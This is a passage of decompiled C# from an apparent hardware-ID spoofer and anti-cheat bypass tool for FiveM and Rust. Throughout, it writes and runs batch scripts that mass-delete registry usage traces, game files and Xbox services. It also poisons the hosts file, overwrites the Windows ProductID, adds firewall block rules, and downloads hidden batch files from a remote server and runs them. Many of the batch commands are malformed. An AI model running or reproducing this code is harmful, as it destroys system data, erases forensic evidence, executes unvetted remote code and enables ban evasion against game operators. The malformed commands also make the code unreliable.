						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
						streamWriter.WriteLine(":folderclean");
						streamWriter.WriteLine("call :getDiscordVersion");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("goto :xboxclean");
						streamWriter.WriteLine(": getDiscordVersion");
						streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
						streamWriter.WriteLine("     set 'varLoc =%%a'");
						streamWriter.WriteLine("   goto :d1");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine(":d1");
						streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
						streamWriter.WriteLine("     set 'discordVersion =%%z'");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine("goto :EOF");
						streamWriter.WriteLine(": xboxclean");
						streamWriter.WriteLine(" cls");
						streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
						streamWriter.WriteLine("sc stop XblAuthManager");
						streamWriter.WriteLine("sc stop XblGameSave");
						streamWriter.WriteLine("sc stop XboxNetApiSvc");
						streamWriter.WriteLine("sc stop XboxGipSvc");
						streamWriter.WriteLine("sc delete XblAuthManager");
						streamWriter.WriteLine("sc delete XblGameSave");
						streamWriter.WriteLine("sc delete XboxNetApiSvc");
						streamWriter.WriteLine("sc delete XboxGipSvc");
						streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
						streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
						streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
						streamWriter.WriteLine("exit");
						streamWriter.WriteLine("goto :eof");
					}
					Process process = Process.Start(text);
					process.WaitForExit();
					File.Delete(text);
					string path = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path))
					{
						Directory.CreateDirectory(path);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text2 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter2 = File.CreateText(text2))
						{
							streamWriter2.WriteLine("netsh int ip reset");
						}
						Process process2 = new Process();
						process2.StartInfo.FileName = text2;
						this.d.Add(process2);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process2.Start();
					}
					string text3 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter3 = new StreamWriter(text3))
					{
						streamWriter3.WriteLine("echo off");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("taskkill /f /im Steam.exe /t");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
						streamWriter3.WriteLine("cls");
					}
					Process process3 = Process.Start(text3);
					process3.WaitForExit();
					File.Delete(text3);
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.FiveM();
					Main.bi();
					string path2 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path2))
					{
						Directory.CreateDirectory(path2);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text4 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter4 = File.CreateText(text4))
						{
							streamWriter4.WriteLine("netsh int ip reset");
						}
						Process process4 = new Process();
						process4.StartInfo.FileName = text4;
						this.d.Add(process4);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process4.Start();
						Thread.Sleep(500);
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					string tempPath = Path.GetTempPath();
					byte[] bytes = Login.KeyAuthApp.download("921776");
					File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
					File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
					{
						Directory.Delete(folderPath + "\\DigitalEntitlements", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
					}
					Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
					if (Directory.Exists(folderPath2 + "\\CitizenFX"))
					{
						Directory.Delete(folderPath2 + "\\CitizenFX", true);
					}
					string path3 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path3))
					{
						Directory.CreateDirectory(path3);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					else
					{
						string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
						string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, fileName);
						File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					MessageBox.Show("FiveM Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.aq.Text == "FiveM Bypass")
				{
					base.Hide();
					Process[] processesByName = Process.GetProcessesByName("FiveM");
					if (processesByName.Length != 0)
					{
						foreach (Process process5 in Process.GetProcessesByName("FiveM"))
						{
							process5.Kill();
						}
					}
					if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
					{
						Directory.Delete("C:\\Program Files (x86)\\Blade Group");
						Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
					}
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					new Process
					{
						StartInfo = new ProcessStartInfo
						{
							WindowStyle = ProcessWindowStyle.Hidden,
							FileName = "cmd.exe",
							Arguments = "/C Start Explorer.exe fivem://connect/" + this.bx.Text
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = "cmd.exe",
							CreateNoWindow = true,
							RedirectStandardInput = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							Verb = "runas",
							Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
						}
					}.Start();
					base.Hide();
					System.Timers.Timer timer = new System.Timers.Timer(50.0);
					timer.AutoReset = true;
					timer.Elapsed += Main.MyMethod2;
					timer.Start();
				}
				else if (this.aq.Text == "Rust")
				{
					string tempPath2 = Path.GetTempPath();
					byte[] bytes2 = Login.KeyAuthApp.download("203677");
					File.WriteAllBytes(tempPath2 + this.c + ".bat", bytes2);
					File.SetAttributes(tempPath2 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath2 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					d d2 = new d();
					d2.b();
					Main.HWIDclick();
					string value = string.Concat(new string[]
					{
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5)
					});
					RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
					registryKey.SetValue("ProductID", value);
					registryKey.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
